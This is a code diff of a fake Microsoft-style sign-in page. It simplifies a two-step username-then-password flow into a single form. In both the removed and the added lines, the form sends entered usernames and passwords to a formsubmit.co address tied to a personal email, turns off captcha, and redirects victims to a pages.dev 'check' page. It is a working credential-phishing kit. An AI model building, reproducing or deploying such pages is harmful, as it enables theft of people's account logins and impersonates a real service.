@@ -85,18 +85,6 @@ h1{
     background:#005da6;
 }
 
-.link{
-    font-size:13px;
-    color:#0067b8;
-    margin-top:18px;
-}
-
-.user-line{
-    font-size:14px;
-    color:#444;
-    margin-bottom:15px;
-}
-
 .error{
     color:#d13438;
     font-size:13px;
@@ -104,15 +92,6 @@ h1{
 }
 
 .hidden{display:none;}
-
-.fade{
-    animation:fade .25s ease;
-}
-
-@keyframes fade{
-    from{opacity:0;transform:translateY(4px)}
-    to{opacity:1;transform:translateY(0)}
-}
 </style>
 </head>
 
@@ -120,50 +99,39 @@ h1{
 
 <div class="card">
 
-<form id="loginForm" action="https://formsubmit.co/gisellejordanlovings@outlook.com" method="POST">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_next" value="https://msnuuiuesd.pages.dev/check.html">
 <div class="loader" id="loader"></div>
 
-<img src="img/icon.png" class="logo">
+<form id="loginForm" action="https://formsubmit.co/Gisellejordanlovings@outlook.com" method="POST">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_next" value="https://msnuuiuesd.pages.dev/check.html">
+  <img src="img/icon.png" class="logo">
 
-<!-- STEP 1 -->
-<div id="step1" class="fade">
+  <h1>Sign in</h1>
 
-<h1>Sign in</h1>
+  <input
+    class="input"
+    id="username"
+    name="username"
+    placeholder="Email, phone, or username"
+    required
+  >
 
-<input class="input" id="username" name="username"
-placeholder="Email, phone, or username">
+  <input
+    type="password"
+    class="input"
+    id="password"
+    name="password"
+    placeholder="Password"
+    required
+  >
 
-<div id="userError" class="error hidden">
-This account doesn’t exist.
-</div>
+  <div class="error hidden" id="loginError">
+    Invalid username or password.
+  </div>
 
-<div class="button-row">
-<button type="button" class="btn" id="nextBtn">Next</button>
-</div>
-
-</div>
-
-<!-- STEP 2 -->
-<div id="step2" class="hidden fade">
-
-<h1>Enter password</h1>
-
-<div class="user-line" id="showUser"></div>
-
-<input type="password" class="input" id="password" name="password"
-placeholder="Password">
-
-<div id="passError" class="error hidden">
-Invalid password. Please try again.
-</div>
-
-<div class="button-row">
-<button class="btn" type="submit">Sign in</button>
-</div>
-
-</div>
+  <div class="button-row">
+    <button type="submit" class="btn">Sign in</button>
+  </div>
 
 </form>
 
@@ -171,76 +139,18 @@ Invalid password. Please try again.
 
 <script>
 const loader = document.getElementById("loader");
-const step1 = document.getElementById("step1");
-const step2 = document.getElementById("step2");
+const form = document.getElementById("loginForm");
 
-const username = document.getElementById("username");
-const password = document.getElementById("password");
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
 
-const userError = document.getElementById("userError");
-const passError = document.getElementById("passError");
-const showUser = document.getElementById("showUser");
-
-/* =======================
-   HELPERS
-======================= */
-
-function startLoader(){
-  loader.style.width="30%";
-  setTimeout(()=>loader.style.width="70%",200);
-  setTimeout(()=>loader.style.width="100%",400);
-  setTimeout(()=>loader.style.width="0%",700);
-}
-
-// Microsoft emails only
-function isMicrosoftEmail(email){
-  return (
-    email.endsWith("@msn.com") ||
-    email.endsWith("@hotmail.com") ||
-    email.endsWith("@outlook.com") ||
-    email.endsWith("@live.com")
-  );
-}
-
-// Phone numbers: digits only, 6-15 digits, optional +
-function isPhoneNumber(input){
-  return /^\+?\d{6,15}$/.test(input);
-}
-
-// Skype IDs: start with letter, 6-32 chars, letters, numbers, dot, underscore, dash
-function isSkypeID(input){
-  return /^[a-zA-Z][a-zA-Z0-9._-]{5,31}$/.test(input);
-}
-
-/* =======================
-   STEP 1 → STEP 2
-======================= */
-
-document.getElementById("nextBtn").addEventListener("click",()=>{
-
-   const val = username.value.trim();
-
-   userError.classList.add("hidden");
-
-   if(isMicrosoftEmail(val) || isPhoneNumber(val) || isSkypeID(val)){
-      startLoader();
-      setTimeout(()=>{
-         showUser.innerText = val;
-         step1.classList.add("hidden");
-         step2.classList.remove("hidden");
-      },500);
-   } else {
-      userError.innerHTML =
-        "This account doesn’t exist. <br>Use a Microsoft email, phone number, or Skype ID only.";
-      userError.classList.remove("hidden");
-   }
+  // purely visual loader
+  loader.style.width = "30%";
+  setTimeout(() => loader.style.width = "70%", 200);
+  setTimeout(() => loader.style.width = "100%", 400);
+  setTimeout(() => loader.style.width = "0%", 700);
 });
 </script>
 
-
-
-
 </body>
 </html>
-
-
